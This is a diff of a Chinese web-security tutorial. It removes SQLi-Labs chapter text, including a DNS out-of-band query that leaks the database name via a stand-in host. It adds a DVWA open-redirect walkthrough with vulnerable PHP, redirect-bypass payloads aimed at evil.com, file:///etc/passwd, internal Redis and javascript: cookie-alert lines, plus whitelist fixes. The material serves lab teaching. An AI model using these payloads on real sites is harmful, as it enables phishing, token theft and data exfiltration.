+    <text x="175" y="255" font-family="Consolas" font-size="12" fill="#16a34a" font-weight="bold">③ GET /home.php</text>
+    <polygon points="160,260 210,260 205,255 205,265" fill="#16a34a"/>
+    <text x="175" y="290" font-family="Microsoft YaHei" font-size="10" fill="#166534">👉 最终停留在【icbc.com.cn/home.php】✅ 安全</text>
+  </g>
+  <!-- 右侧：恶意跳转 -->
+  <g transform="translate(455,70)">
+    <rect x="0" y="0" width="425" height="325" rx="14" fill="white" stroke="#dc2626" stroke-width="2.5"/>
+    <rect x="0" y="0" width="425" height="48" rx="14" fill="#dc2626"/>
+    <rect x="0" y="34" width="425" height="14" fill="#dc2626"/>
+    <text x="212" y="30" text-anchor="middle" font-family="Microsoft YaHei" font-size="17" font-weight="bold" fill="white">❌ 恶意跳转（forward=//evil.com）</text>
+    <!-- 浏览器 -->
+    <g transform="translate(20,80)">
+      <rect x="0" y="0" width="110" height="55" rx="8" fill="#dbeafe" stroke="#1d4ed8"/>
+      <circle cx="14" cy="12" r="4" fill="#ef4444"/>
+      <circle cx="28" cy="12" r="4" fill="#f59e0b"/>
+      <circle cx="42" cy="12" r="4" fill="#22c55e"/>
+      <rect x="5" y="24" width="100" height="24" rx="4" fill="white" stroke="#1d4ed8"/>
+      <text x="55" y="40" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#1e3a8a">🌐 浏览器</text>
+    </g>
+    <text x="175" y="110" font-family="Consolas" font-size="12" fill="#16a34a" font-weight="bold">① GET</text>
+    <polygon points="160,115 210,115 205,110 205,120" fill="#16a34a"/>
+    <text x="175" y="135" font-family="Microsoft YaHei" font-size="10" fill="#7f1d1d" font-weight="bold">/redirect.php?forward=//evil.com</text>
+    <!-- 服务器 -->
+    <g transform="translate(285,80)">
+      <rect x="0" y="0" width="120" height="55" rx="8" fill="#dcfce7" stroke="#15803d"/>
+      <text x="60" y="24" text-anchor="middle" font-family="Microsoft YaHei" font-size="12" fill="#14532d" font-weight="bold">🖥️ 服务器</text>
+      <text x="60" y="42" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#166534">icbc.com.cn</text>
+    </g>
+    <text x="175" y="180" font-family="Consolas" font-size="12" fill="#f59e0b" font-weight="bold">② 302 Found</text>
+    <polygon points="210,185 160,185 165,180 165,190" fill="#f59e0b"/>
+    <g transform="translate(135,195)">
+      <rect x="0" y="0" width="165" height="30" rx="6" fill="#fecaca" stroke="#dc2626"/>
+      <text x="82" y="20" text-anchor="middle" font-family="Consolas" font-size="11" fill="#7f1d1d" font-weight="bold">Location: https://evil.com</text>
+    </g>
+    <text x="175" y="255" font-family="Consolas" font-size="12" fill="#dc2626" font-weight="bold">③ GET evil.com</text>
+    <polygon points="160,260 210,260 205,255 205,265" fill="#dc2626"/>
+    <text x="175" y="290" font-family="Microsoft YaHei" font-size="10" fill="#7f1d1d" font-weight="bold">👉 最终跑到【黑客服务器】❌ 被钓鱼！</text>
+  </g>
+</svg>
 
-在SQLi-Labs的Less-66和Less-67中，实际的场景是这样的：
+### 17.1.3 开放式重定向到底有啥危害？4 个真实场景
 
-你输入一个password，系统会计算它的哈希（SHA1或MD5），然后用这个哈希值去查询数据库。
+很多初学者会觉得："不就是跳个转吗？有啥大不了的？"——看完下面这 4 个你就懂了👇
 
-SQL大概是这样的：
-```sql
-SELECT * FROM users WHERE password = '$hash'
+| 危害级别 | 攻击场景 | 真实案例/原理 | 严重程度 |
+|---|---|---|---|
+| 🔥🔥🔥 顶级 | **钓鱼欺诈** | 银行/政务域名带 `?redirect=假网站`，受害者看到是真官网不怀疑，输密码就被偷走 | 🔴 高危，每年涉案金额数十亿 |
+| 🔥🔥 高级 | **OAuth Token 窃取** | 登录授权 URL 里带 `redirect_uri=黑客域名`，用户点"同意授权"后 token 直接 POST 到黑客手里 | 🔴 高危，几乎所有大厂 OAuth 踩过 |
+| 🔥 中级 | **XSS 放大器 / CSP 绕过** | 把 `javascript:` 协议丢进 Location，配合某些浏览器直接执行脚本（老版本） | 🟠 中危 |
+| ⭐ 基础 | **网址/品牌信誉损害** | 官网链接跳去菠菜、黄色网站，被搜索引擎标记为"不安全" | 🟡 中危 |
+
+> 🚨 **CISP-PTE 考点 + CTF 常考题型：** Open Redirect 是"逻辑漏洞四大金刚"（重定向+越权+验证码+支付逻辑）里最简单的一个，**每年 CISP-PTE 机试必考一题，CTF 入门赛基本一题 50 分起**，今天拿下它等于白捡分！🎉
+
+---
+
+## 17.2 正式闯关：DVWA Open Redirect Low 级别（完全裸奔）🔓
+
+### 17.2.1 正常玩家视角：页面长啥样？
+
+登录 DVWA → 切 security=**low** → 左侧点 **Open HTTP Redirect** 菜单。
+
+你会看到一个提示：
+
+```
+Click to redirect the user.
+👉 一个超链接：Redirect test #1
+👉 点击链接后的 URL：/vulnerabilities/open_redirect/source/low.php?id=yes
 ```
 
-这时候，如果我们能让$hash的值变成 `' or 1=1 #` 之类的，就能注入了。
+点一下 "Redirect test #1"，浏览器会跳到 `/index.php`（站内首页）——**这是一个正常的"退出登录后跳首页"的功能**，id 参数决定"跳不跳转"，表面看不出毛病。
 
-但是，哈希值里只有十六进制字符啊！怎么会有单引号？
+### 17.2.2 漏洞触发：把 `?id=yes` 换成 `?redirect=https://baidu.com`？不对，先看源码！
 
-哦！等等！我知道了！**如果哈希值是数字开头的，而且是数字型注入呢？**
+Low 级别的源码如下（**跟你想的可能不一样！** DVWA Low 不是直接 `?redirect=xxx` 那么直白）：
 
-不对，数字型注入也需要空格、or这些啊...
-
-好吧，我承认，哈希注入这东西，对新手来说确实有点偏门。而且在真实场景中，遇到的概率也不高。
-
-那怎么办呢？很简单：**这两关大家了解一下有这么个东西就行，不用死磕！**
-
-#### 那具体怎么过呢？
-
-其实啊，SQLi-Labs的这两关，是可以用一些特殊的输入来绕过的。比如：
-
-- 找一个输入，它的MD5/SHA1值刚好是 `'or'1'='1` 这样的
-- 或者用其他技巧
-
-但是，找这种输入需要用工具跑碰撞，新手的话，知道有这么个概念就行了。
-
-**简单说：哈希注入就是——你的输入会被哈希，然后哈希值拼到SQL里，你需要找到一个输入，它的哈希值刚好能形成注入。**
-
-就这么简单！知道有这么回事就行了，以后遇到了再深入研究~
-
----
-
-### 17.3.3 Less-67：GET - 单引号 - 哈希注入 - MD5 🎯
-
-Less-67和Less-66几乎一样，只不过哈希算法从SHA1变成了MD5。
-
-原理都是一样的，就是找一个输入，它的MD5哈希值刚好能形成注入。
-
-这里就不多说了，大家知道有这么个东西就行。
-
-#### 小结
-
-哈希注入属于比较偏门的注入方式，新手了解一下概念就好，不用花太多时间死磕。
-
-就像你学武术，先把基础拳法练好，那些偏门的暗器功夫，以后有空再学也不迟！🥋
-
----
-
-## 17.4 Less68-69：进阶场景 🌟
-
-### 17.4.1 Less-68：二次注入进阶 🎯
-
-Less-68是二次注入的进阶版。
-
-二次注入我们之前应该学过了，对吧？简单说就是：
-- 第一步：你提交一个包含恶意代码的输入，被存到数据库里
-- 第二步：你触发另一个操作，把数据库里的恶意代码读出来，拼到SQL里执行
-
-这就是二次注入。
-
-Less-68是更复杂的二次注入场景，可能需要更多的步骤，或者更隐蔽的利用方式。
-
-但是，核心原理还是一样的：**数据存进去的时候没问题，取出来用的时候出问题了。**
-
-就像你把一颗种子种在土里，当时没什么事，等它生根发芽了，就会把地面顶破！🌱
-
-这关大家可以自己去研究研究，就当是锻炼思维了。
-
----
-
-### 17.4.2 Less-69：页面跳转型注入 🎯
-
-Less-69是页面跳转型注入。
-
-什么意思呢？就是你注入之后，页面会跳转，你看不到执行结果。
-
-这怎么办呢？看不到结果怎么获取数据啊？
-
-别急，有办法！
-
-#### 方法一：时间盲注 ⏰
-
-看不到结果没关系，我们可以用时间盲注啊！
-- 猜对了 → 页面延迟
-- 猜错了 → 页面不延迟
-
-通过判断响应时间，我们就能知道数据了。
-
-#### 方法二：DNS外带 🌐
-
-这个就高级了。简单说就是，把数据拼到域名里，然后让服务器去请求这个域名，我们通过查看DNS日志就能拿到数据。
-
-比如：
-```sql
-select load_file(concat('\\\\',(select database()),'.test.com\\abc'))
+```php
+<?php
+if (array_key_exists ("redirect", $_GET) && $_GET['redirect'] != NULL) {
+    header("Location: " . $_GET['redirect']);  // 直接拼用户输入到 Location！
+    exit;
+}
+?>
 ```
 
-这样服务器就会去查询 `数据库名.test.com` 的DNS记录，我们就能拿到数据了。
+哦！参数名不是 `id`，而是叫 **`redirect`**！
 
-不过这个方法需要有自己的域名，而且环境也有限制，新手了解一下就行。
+所以漏洞 payload 超级简单：**直接把任意 URL 填到 redirect 参数里**，服务器就会把它拼到 Location 里。下面给你 5 种不同的跳法（都属于 Low 级别 payload 大全），**零基础同学照着敲就行**👇
 
-#### 方法三：HTTP头注入？
+```
+┌─ Low 级别 Payload 大全 ① 绝对路径形式 ────────────────────────────┐
+│                                                                    │
+│   http://192.168.56.102/dvwa/vulnerabilities/open_redirect/       │
+│   source/low.php?redirect=https://www.baidu.com                   │
+│                                                                    │
+│   👉 点击后：HTTP 302 → 直接跳百度！✅                             │
+└────────────────────────────────────────────────────────────────────┘
 
-不对，页面跳转的话，我们也可以看看跳转的时候有没有把数据带到URL里，或者带到Cookie里。
+┌─ ② 协议相对路径形式（绕过必须 http 开头的简单检测）────────────────┐
+│                                                                    │
+│   ?redirect=//www.baidu.com                                        │
+│                                                                    │
+│   👉 浏览器会自动补全当前协议 http(s):// + //域名，照样跳外网！✅   │
+└────────────────────────────────────────────────────────────────────┘
 
-总之，方法总比困难多！
+┌─ ③ 只带 // 的最短形式（CTF 里的常客）────────────────────────────┐
+│                                                                    │
+│   ?redirect=//evil.com                                             │
+│                                                                    │
+│   👉 跟 ② 完全等价，比 http://evil.com 少写 7 个字符！✅           │
+└────────────────────────────────────────────────────────────────────┘
 
-#### 小结
+┌─ ④ 内网 SSRF 配合使用（Day23 SSRF 会展开，今天先记住）────────────┐
+│                                                                    │
+│   ?redirect=http://127.0.0.1:6379                                  │
+│   ?redirect=file:///etc/passwd                                     │
+│                                                                    │
+│   👉 可以跳去内网、跳去 file 协议读文件！✅（某些浏览器限制 file）  │
+└────────────────────────────────────────────────────────────────────┘
 
-页面跳转型注入，就是**你看不到直接的结果，但可以通过其他间接的方式获取数据**。
+┌─ ⑤ javascript: 伪协议（老版本 Chrome/IE 会执行 XSS）──────────────┐
+│                                                                    │
+│   ?redirect=javascript:alert(document.cookie)                      │
+│                                                                    │
+│   👉 现在主流浏览器会禁止 Location 跳 javascript: 执行，了解即可！ │
+└────────────────────────────────────────────────────────────────────┘
+```
 
-就像你在一个黑屋子里，虽然看不到东西，但你可以用耳朵听、用手摸，也能知道屋里有什么！👂
+### 17.2.3 Low 源码解析：问题就出在一行代码上 💻
 
----
+```php
+<?php
+// vulnerabilities/open_redirect/source/low.php
+if (array_key_exists("redirect", $_GET) && $_GET['redirect'] != NULL) {
+    // ⚠️ 致命问题：用户的 redirect 参数 100% 原样进 Location！
+    header("Location: " . $_GET['redirect']);
+    exit;
+}
+?>
+```
 
-## 17.5 Less70-75：综合挑战 🎮
+**Low 级别问题总结（2 点）：**
+1. **❌ 完全没有白名单 / 黑名单校验：** 没判断 redirect 是不是站内路径、有没有包含自己域名
+2. **❌ 没有限制协议：** http/https/file/javascript 都能进 Location 头
 
-好，终于到了最后6关了！Less-70到Less-75。
-
-这几关是什么呢？简单说就是：**各种技术的综合运用！**
-
-可能一关里面既有过滤绕过，又有盲注，还有其他乱七八糟的限制。
-
-就像游戏里的最终Boss，什么技能都会，特别难打。
-
-但是，别怕！我给你们的建议是：
-
-> **这几关，新手可以先放一放，等以后基础扎实了再来挑战！**
-
-为什么呢？因为：
-1. 这些关卡难度确实比较高，新手容易卡壳，打击信心
-2. 前面的69关已经足够你掌握SQL注入的核心了
-3. 等你以后实战经验多了，再回来看，可能就觉得简单了
-
-### 生活小例子 🎮
-
-想象一下：
-- 你在玩一个RPG游戏
-- 刚打完普通关卡，等级还不够高
-- 这时候有个隐藏Boss，特别难打
-- 你非要去硬刚，结果死了一次又一次，心态都崩了
-
-这时候聪明的做法是什么？
-- 先去练级，把等级升上去
-- 把装备弄好
-- 等实力够了，再来收拾它
-
-我们学习也是一样的！**不要死磕超出自己能力范围太多的东西，循序渐进才是正道！** 📈
-
-所以，Less-70到Less-75，大家可以先标记一下，等以后SQL注入水平提高了，再回来挑战。
-
----
-
-## 17.6 SQLi-Labs通关总结 🎉
-
-好了，到这里，SQLi-Labs的75关我们就全部走完了！
-
-虽然最后几关我们没有细讲，但核心的内容都已经覆盖到了。
-
-现在，让我们来做一个大大的总结！看看这一路下来，我们都学到了什么？
-
-### 17.6.1 SQL注入的各种类型 📚
-
-**1. 联合查询注入（UNION）**
-- 最常用、效率最高
-- 需要页面有回显位
-- 核心：union select把查询结果拼到原查询结果里
-
-**2. 报错注入**
-- 利用数据库的报错信息返回数据
-- 常用函数：updatexml、extractvalue、floor等
-- 适合有报错信息但没有回显位的场景
-
-**3. 盲注**
-- 布尔盲注：通过页面真假判断
-- 时间盲注：通过响应时间判断
-- 效率低，但适合完全没有回显的场景
-
-**4. 堆叠注入**
-- 一次执行多条SQL语句
-- 用分号分隔
-- 不是所有数据库都支持
-
-### 17.6.2 注入点的各种位置 📍
-
-- GET参数注入
-- POST参数注入
-- Cookie注入
-- User-Agent注入
-- Referer注入
-- X-Forwarded-For注入
-- Order By注入
-- ...
-
-**记住：只要是用户可控的内容，拼到SQL里了，就可能有注入！**
-
-### 17.6.3 各种绕过技巧 🎭
-
-- 过滤空格：用注释、括号、加号等绕过
-- 过滤关键字：大小写、双写、编码、等价函数等绕过
-- WAF绕过：分块传输、HTTP参数污染等
-- 宽字节注入：利用编码问题绕过转义
-- ...
-
-### 17.6.4 注入的本质 💡
-
-说了这么多，其实SQL注入的本质特别简单，就两句话：
-
-> **1. 用户输入可控**
-> **2. 输入被拼接到SQL语句中执行**
-
-就这么简单！所有的SQL注入，万变不离其宗！
-
-只要抓住了这个本质，不管什么场景，你都能分析明白。
-
-### 生活小例子 🏠
-
-想象一下：
-- 你家有个智能门锁，你说"开门"它就开门
-- 但是它分不清哪些是你的指令，哪些是别人说的话
-- 这时候如果有人在你旁边喊"开门"，门也会开
-
-这就是"注入"的本质——**系统分不清指令和数据，把数据当成了指令执行！**
-
-SQL注入是这样，XSS是这样，命令注入也是这样，所有注入类漏洞的本质都是一样的！
-
-想明白了这个，你就一通百通了！✨
+**修复方向（Low → Impossible）：** 用**严格白名单**（`$allow_list = ['/index.php', '/login.php', '/home.php']`），**只允许跳本站的相对路径**，详见 17.5 节。
 
 ---
 
-## 17.7 手工注入 vs 工具注入 🛠️
+## 17.3 Medium 级别：加了 `strpos` 检测？有 3 种绕过！🚩
 
-学了这么久手工注入，可能有同学会问：
+Medium 级别是 DVWA 里"最具有教育意义"的一个级别——开发者**自以为**加了防护，实际上 **3 种姿势就能绕过去**，而且每一种都是真实护网里的 Payload！
 
-> "现在都有sqlmap了，一键就能跑，为什么还要学手工注入啊？"
+### 17.3.1 先看 Medium 源码，开发者加了什么"防护"？
 
-这是个好问题！我们来好好聊聊。
+```php
+<?php
+if (array_key_exists("redirect", $_GET) && $_GET['redirect'] != NULL) {
+    $target = $_GET['redirect'];
+    // 开发者：嗯！我只允许以 http:// 开头的 URL，防止相对路径乱跳！完美！😎
+    if (strpos($target, "http://") === 0 || strpos($target, "https://") === 0) {
+        header("Location: " . $target);  // 直接跳转
+        exit;
+    } else {
+        // 非 http(s):// 开头？不让跳！（开发者觉得"安全了"）
+        header("Location: /index.php");
+    }
+}
+?>
+```
 
-### 17.7.1 为什么要学手工注入？🤔
+开发者的"安全逻辑"翻译成人话：
 
-**1️⃣ 理解原理，才能应对复杂场景 🧠**
+> **"我只允许跳 http:// 或 https:// 开头的 URL，这样重定向就只能是合法的绝对链接了！我的网站无敌了！"** 🤣🤣🤣
 
-工具虽然方便，但它是死的，人是活的。
+哈哈哈哈这是最经典的"**校验了个寂寞**"——坏人要跳的恶意网站本来就是 `https://evil.com`，它本来就以 `https://` 开头啊！！😆
 
-如果遇到一个很复杂的场景，工具识别不出来，或者跑不出来，怎么办？
+**绕过方法 ①：用本来就 https:// 开头的恶意域名（最朴素也最有效）**
 
-这时候就需要你手工分析，手工调整payload了。
+```
+✅ Payload：
+/vulnerabilities/open_redirect/source/medium.php?redirect=https://www.baidu.com
 
-如果你只会用工具，不懂原理，那你就只会"一把梭"，梭不出来就傻眼了。
+👉 结果：直接跳外网！strpos() 判断为真，完美放行！
+```
 
-**2️⃣ 面试必备 💼**
+**这就是为什么 DVWA Medium 里这个校验等于没加。** 真实世界里可能会写"必须包含 `example.com`"，那我们继续往下看另外两种更高阶的绕过。
 
-去面试安全岗位，面试官肯定会问SQL注入的原理、各种类型、绕过方法...
+### 17.3.2 绕过方法 ②：使用 `@` 符号，把 `example.com` 变成"假的 Basic Auth 用户名"
 
-总不能你跟面试官说："我不会手工，我只会用sqlmap"吧？那肯定凉凉。
+这是 CTF 里绕"必须包含 xxx.com"的**头号大招**！**HTTP 协议规定：** URL 格式里 `https://用户名:密码@域名/路径`，@前面的部分是 Basic Auth 的用户名，**根本不是域名！** 浏览器会自动忽略 @ 之前的部分，直接访问 @ 后面的真实域名！
 
-**3️⃣ 更有成就感 🏆**
+```
+真实例子：
+https://evil.com@google.com   →   浏览器实际跳去的是：✅ google.com
+https://baidu.com@evil.com    →   浏览器实际跳去的是：✅ evil.com！
+```
 
-靠自己的脑子，一行一行写payload，最后成功注入的时候，那种成就感，是工具给不了的！
+**假设 Medium 加了"必须包含 baidu.com"的校验，Payload 长这样：**
 
-就像你打游戏，靠自己的技术通关，和开外挂通关，感觉能一样吗？🎮
+```
+绕过前：https://evil.com                → ❌ 校验失败（没有 baidu.com）
+绕过：  https://baidu.com@evil.com      → ✅ strpos("baidu.com") 命中！实际跳 evil.com！
+```
 
-### 17.7.2 什么时候用工具？⏰
+**太帅了有没有！！** 真实浏览器拿到这个 URL 会直接把 `baidu.com` 解释成 Basic Auth 账号，后面才是真正要去的域名 😎。
 
-那工具就没用了吗？当然不是！工具很有用！
+### 17.3.3 绕过方法 ③：使用 `#` 锚点/或 `?` 参数，把白名单域名丢到不被解析的位置
 
-**1️⃣ 实战提高效率 ⚡**
+跟绕过方法 ② 是同一种思路——**让"被要求出现的字符串"出现在 URL 里，但位置不影响真实跳转目标**。
 
-在真实的渗透测试中，时间是很宝贵的。
+- **用 `?` 查询参数：**
+  ```
+  白名单要求：URL 里必须包含 example.com
+  Payload：  https://evil.com?example.com
+             ✅ 包含了！但它只是查询参数的一部分，实际去 evil.com
+  ```
+- **用 `#` 锚点片段：**
+  ```
+  Payload：  https://evil.com#https://example.com
+             ✅ 既包含了 http:// 开头（Medium 当前校验），
+             又能把 example.com 塞到不影响解析的锚点里。
+  ```
+- **用 `.` 做子域名绕过（真实业务如果校验 "域名包含 example.com"）**
+  ```
+  白名单要求：strpos($url, 'example.com') !== false
+  Payload：  https://example.com.evil.com
+             ✅ 子域名方式包含 example.com，实际去 evil.com 的子域名！
+  ```
 
-一个注入点，手工可能要搞半小时，sqlmap可能几分钟就跑出来了。
+### 17.3.4 一张速查表记住所有 Medium/通用绕过姿势（面试/CTF 背它）
 
-这时候当然用工具啊！效率第一！
+<svg width="100%" viewBox="0 0 900 530" xmlns="http://www.w3.org/2000/svg" style="margin:20px 0;">
+  <rect x="0" y="0" width="900" height="530" rx="14" fill="#fef3c7" stroke="#d97706" stroke-width="2.5"/>
+  <text x="450" y="40" text-anchor="middle" font-family="Microsoft YaHei" font-size="20" fill="#78350f" font-weight="bold">📋 Open Redirect 绕过姿势速查表（CISP/CTF 必背！）</text>
+  <!-- 列1 -->
+  <g transform="translate(25,70)">
+    <rect x="0" y="0" width="280" height="110" rx="12" fill="white" stroke="#dc2626" stroke-width="2"/>
+    <rect x="0" y="0" width="280" height="38" rx="12" fill="#dc2626"/>
+    <rect x="0" y="27" width="280" height="11" fill="#dc2626"/>
+    <text x="140" y="23" text-anchor="middle" font-family="Microsoft YaHei" font-size="15" fill="white" font-weight="bold">姿势 1 @ 认证绕过</text>
+    <rect x="10" y="50" width="260" height="28" rx="6" fill="#0f172a"/>
+    <text x="140" y="68" text-anchor="middle" font-family="Consolas" font-size="12" fill="#fbbf24">https://白名单@evil.com</text>
+    <text x="140" y="100" text-anchor="middle" font-family="Microsoft YaHei" font-size="12" fill="#7f1d1d">白名单丢到 Basic Auth 用户名位</text>
+  </g>
+  <!-- 列2 -->
+  <g transform="translate(310,70)">
+    <rect x="0" y="0" width="280" height="110" rx="12" fill="white" stroke="#ea580c" stroke-width="2"/>
+    <rect x="0" y="0" width="280" height="38" rx="12" fill="#ea580c"/>
+    <rect x="0" y="27" width="280" height="11" fill="#ea580c"/>
+    <text x="140" y="23" text-anchor="middle" font-family="Microsoft YaHei" font-size="15" fill="white" font-weight="bold">姿势 2 子域名 . 绕过</text>
+    <rect x="10" y="50" width="260" height="28" rx="6" fill="#0f172a"/>
+    <text x="140" y="68" text-anchor="middle" font-family="Consolas" font-size="12" fill="#fbbf24">https://白名单.evil.com</text>
+    <text x="140" y="100" text-anchor="middle" font-family="Microsoft YaHei" font-size="12" fill="#9a3412">把白名单变成 evil.com 的子域</text>
+  </g>
+  <!-- 列3 -->
+  <g transform="translate(595,70)">
+    <rect x="0" y="0" width="280" height="110" rx="12" fill="white" stroke="#ca8a04" stroke-width="2"/>
+    <rect x="0" y="0" width="280" height="38" rx="12" fill="#ca8a04"/>
+    <rect x="0" y="27" width="280" height="11" fill="#ca8a04"/>
+    <text x="140" y="23" text-anchor="middle" font-family="Microsoft YaHei" font-size="15" fill="white" font-weight="bold">姿势 3 ? 查询参数绕过</text>
+    <rect x="10" y="50" width="260" height="28" rx="6" fill="#0f172a"/>
+    <text x="140" y="68" text-anchor="middle" font-family="Consolas" font-size="12" fill="#fbbf24">https://evil.com?白名单</text>
+    <text x="140" y="100" text-anchor="middle" font-family="Microsoft YaHei" font-size="12" fill="#713f12">白名单塞到不解析的 query 里</text>
+  </g>
+  <!-- 第二行 -->
+  <g transform="translate(25,200)">
+    <rect x="0" y="0" width="280" height="110" rx="12" fill="white" stroke="#16a34a" stroke-width="2"/>
+    <rect x="0" y="0" width="280" height="38" rx="12" fill="#16a34a"/>
+    <rect x="0" y="27" width="280" height="11" fill="#16a34a"/>
+    <text x="140" y="23" text-anchor="middle" font-family="Microsoft YaHei" font-size="15" fill="white" font-weight="bold">姿势 4 # 锚点绕过</text>
+    <rect x="10" y="50" width="260" height="28" rx="6" fill="#0f172a"/>
+    <text x="140" y="68" text-anchor="middle" font-family="Consolas" font-size="12" fill="#fbbf24">https://evil.com#白名单</text>
+    <text x="140" y="100" text-anchor="middle" font-family="Microsoft YaHei" font-size="12" fill="#14532d">锚点部分浏览器不会发给服务器</text>
+  </g>
+  <g transform="translate(310,200)">
+    <rect x="0" y="0" width="280" height="110" rx="12" fill="white" stroke="#0ea5e9" stroke-width="2"/>
+    <rect x="0" y="0" width="280" height="38" rx="12" fill="#0ea5e9"/>
+    <rect x="0" y="27" width="280" height="11" fill="#0ea5e9"/>
+    <text x="140" y="23" text-anchor="middle" font-family="Microsoft YaHei" font-size="15" fill="white" font-weight="bold">姿势 5 // 协议相对</text>
+    <rect x="10" y="50" width="260" height="28" rx="6" fill="#0f172a"/>
+    <text x="140" y="68" text-anchor="middle" font-family="Consolas" font-size="12" fill="#fbbf24">//evil.com/白名单</text>
+    <text x="140" y="100" text-anchor="middle" font-family="Microsoft YaHei" font-size="12" fill="#075985">绕过"必须以 / 开头"的检查</text>
+  </g>
+  <g transform="translate(595,200)">
+    <rect x="0" y="0" width="280" height="110" rx="12" fill="white" stroke="#7c3aed" stroke-width="2"/>
+    <rect x="0" y="0" width="280" height="38" rx="12" fill="#7c3aed"/>
+    <rect x="0" y="27" width="280" height="11" fill="#7c3aed"/>
+    <text x="140" y="23" text-anchor="middle" font-family="Microsoft YaHei" font-size="15" fill="white" font-weight="bold">姿势 6 路径穿越 ../</text>
+    <rect x="10" y="50" width="260" height="28" rx="6" fill="#0f172a"/>
+    <text x="140" y="68" text-anchor="middle" font-family="Consolas" font-size="12" fill="#fbbf24">/白名单/../../evil/</text>
+    <text x="140" y="100" text-anchor="middle" font-family="Microsoft YaHei" font-size="12" fill="#4c1d95">绕过"必须以 /白名单"开头</text>
+  </g>
+  <!-- 实战口诀 -->
+  <g transform="translate(25,335)">
+    <rect x="0" y="0" width="850" height="170" rx="14" fill="#0f172a" stroke="#334155" stroke-width="2"/>
+    <text x="425" y="35" text-anchor="middle" font-family="Microsoft YaHei" font-size="17" fill="#fbbf24" font-weight="bold">🎯 Open Redirect 万能绕过口诀（背这 6 句够你过 99% 的 WAF / 校验）</text>
+    <g transform="translate(30,55)">
+      <text x="0" y="0" font-family="Microsoft YaHei" font-size="14" fill="#a5f3fc">① 怕校验"以 http 开头"？用「//evil.com」协议相对，少写 7 字母！</text>
+      <text x="0" y="30" font-family="Microsoft YaHei" font-size="14" fill="#86efac">② 怕校验"包含白名单域名"？用「白名单@evil.com」把域名塞 Basic Auth 用户名里！</text>
+      <text x="0" y="60" font-family="Microsoft YaHei" font-size="14" fill="#fde68a">③ 还是不行？「白名单.evil.com」子域名大法！看起来有白名单，实际全是我的地牌！</text>
+      <text x="0" y="90" font-family="Microsoft YaHei" font-size="14" fill="#fecaca">④ 「https://evil.com?白名单」丢查询参数；「#白名单」丢锚点，能出现就行不影响解析！</text>
+      <text x="0" y="120" font-family="Microsoft YaHei" font-size="14" fill="#ddd6fe">⑤ 路径白名单？「/whitelist/../../../../target」../ 路径穿越（Day18 文件上传我们还会用到）</text>
+    </g>
+  </g>
+</svg>
 
-**2️⃣ 大量数据的时候 📊**
+### 17.3.5 Medium 源码解析 & 修复思路
 
-如果你要拖一个大库，手工根本不现实，这时候就需要工具了。
+```php
+<?php
+if (array_key_exists("redirect", $_GET) && $_GET['redirect'] != NULL) {
+    $target = $_GET['redirect'];
+    if (strpos($target, "http://") === 0 || strpos($target, "https://") === 0) {
+        // ⚠️ 伪防护：我们要跳的黑客域名本来就 https:// 开头啊！
+        header("Location: " . $target);
+        exit;
+    } else {
+        header("Location: /index.php");
+    }
+}
+?>
+```
 
-**3️⃣ 批量检测的时候 📋**
+**Medium 级别的致命错误：** 它写了校验，但校验的是**无关紧要的条件**（是不是 http(s) 开头），而真正应该校验的——**是不是只允许跳本域名、本路径**，它一个字都没做！
 
-如果你有一堆URL要检测有没有注入，总不能一个一个手工测吧？这时候就需要工具批量扫。
-
-### 17.7.3 正确的姿势 ✅
-
-所以，正确的做法是：
-- **原理要懂，手工要会**
-- **该用工具的时候就用工具**
-
-就像你学数学：
-- 你得先学会手算，理解原理
-- 然后考试的时候该用计算器就用计算器
-
-工具是用来提高效率的，不是用来代替思考的！
-
-### 17.7.4 工具推荐：sqlmap 🔧
-
-说到SQL注入工具，最有名的就是 **sqlmap** 了。
-
-sqlmap有多牛？这么说吧，只要有注入点，基本上就没有sqlmap跑不出来的。
-
-它支持：
-- 各种数据库（MySQL、Oracle、SQL Server、PostgreSQL...）
-- 各种注入类型（联合、报错、盲注、堆叠...）
-- 各种注入位置（GET、POST、Cookie、Header...）
-- 各种绕过WAF的脚本
-- 拖库、提权、拿shell... 应有尽有
-
-简直是SQL注入的"神器"！🌟
-
-当然，神器归神器，你还是得懂原理，不然你连参数都不会调，跑不出来也不知道为什么。
+> 💡 零基础启示：**做安全校验，要校验"你允许的最小集合（白名单）"，而不是校验"你觉得坏的（黑名单/前缀）"。**
+> 开发者的"嗯我只允许 http 开头"就是黑名单思路的反面教材——坏人合法使用 http，你就被干穿了。
 
 ---
 
-## 17.8 下章预告 📢
+## 17.4 High 级别：必须 `id=yes`？但 redirect 参数没校验啊！🤔
 
-好了，SQLi-Labs的75关到这里就告一段落了！
+切 security=**high**，High 级别的源码看起来稍微"复杂"了一点：
 
-从下一章开始，我们将学习两个新内容：
+```php
+<?php
+if (array_key_exists ("redirect", $_GET) && $_GET['redirect'] != NULL) {
+    // 伪防护：要求同时带了 id 参数
+    if (! (array_key_exists("id", $_GET) && $_GET['id'] == "yes")) {
+        header("Location: /index.php?redirectError");
+        exit;
+    }
+    // ⚠️ 但是... redirect 参数依然是直接拼！！完全没校验！！
+    header("Location: " . $_GET['redirect']);
+    exit;
+}
+?>
+```
 
-### 1️⃣ sqlmap的使用 🔧
+哈哈哈又是经典"**前门加锁后门全开**"系列 😂——开发者怕别人"直接调用 redirect.php"，于是加了个"必须带 `id=yes` 才能触发跳转"的前置校验。但**真正的漏洞点 `redirect` 参数**，它跟 Low 级别一模一样！！啥都没改！
 
-既然提到了sqlmap，下一章我们就来好好讲讲这个神器怎么用。
+**绕过方法：把 `id=yes` 也带上就行！**
 
-从基础的参数，到高级的技巧，应有尽有！学会了sqlmap，以后遇到SQL注入就再也不用手撸了（虽然手撸也要会）。
+```
+✅ High 级别 Payload：
+/vulnerabilities/open_redirect/source/high.php?id=yes&redirect=https://www.baidu.com
 
-### 2️⃣ Upload-Labs文件上传专项 📤
+👉 先满足 id=yes（过"不能直接调用"的校验），再把跳的地址写 redirect 里，完美 302 跳外网！
+```
 
-SQL注入玩够了，我们来玩玩另一个常见的高危漏洞——**文件上传漏洞**！
-
-文件上传漏洞有多危险？这么说吧，一旦上传成功，你就能直接拿到网站的webshell，相当于直接控制了网站！
-
-我们会用专门的Upload-Labs靶场来练习，一关一关带你闯！
-
-是不是很期待？😎
-
----
-
-## 🎊 本章小结
-
-恭喜你！坚持完了SQLi-Labs的最后20关！也算是半通关了！
-
-这一章我们学习了：
-
-✅ **查询次数限制下的注入思路** —— 效率优先，打包查询，明确目标
-✅ **哈希注入** —— 了解概念就行，偏门但要知道
